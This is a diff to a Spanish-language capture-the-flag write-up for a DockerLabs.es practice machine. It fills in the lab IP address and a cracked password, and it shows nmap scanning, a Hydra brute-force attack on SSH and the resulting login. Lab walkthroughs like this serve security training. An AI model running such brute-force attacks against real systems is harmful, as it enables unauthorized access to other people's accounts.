@@ -14,14 +14,14 @@
 Comenzamos realizando un escaneo de puertos con **nmap**:
 
 ```bash
-nmap -p- -sS -sCV -n -Pn <IP_VICTIMA>
+nmap -p- -sS -sCV -n -Pn 172.17.0.2
 📊 Resultados relevantes
 22/tcp open  ssh
 80/tcp open  http
 🌐 Análisis del servicio HTTP (Puerto 80)
 Accedemos al servicio web desde el navegador:
 
-http://<IP_VICTIMA>
+http://172.17.0.2
 La página mostraba únicamente la palabra:
 
 tails
@@ -43,14 +43,14 @@ Con esto obtenemos un diccionario más limpio y adaptado a la pista encontrada.
 🔐 Ataque de Fuerza Bruta a SSH
 Utilizamos Hydra para atacar el servicio SSH con el usuario tails:
 
-hydra -l tails -P rockyou_inv.txt ssh://<IP_VICTIMA>
+hydra -l tails -P rockyou_inv.txt ssh://172.17.0.2
 ✅ Credenciales obtenidas
 Usuario: tails
-Contraseña: <password_encontrada>
+Contraseña: 3117548331
 🖥️ Acceso al sistema
 Nos conectamos por SSH:
 
-ssh tails@<IP_VICTIMA>
+ssh tails@172.17.0.2
 Al acceder, comprobamos el usuario actual:
 
 whoami
@@ -85,7 +85,5 @@ Adaptar diccionarios según las pistas encontradas
 
 Verificar privilegios inmediatamente tras acceder
 
-✍️ Autor
-Writeup por: TuNombre
 
 Plataforma: DockerLabs.es
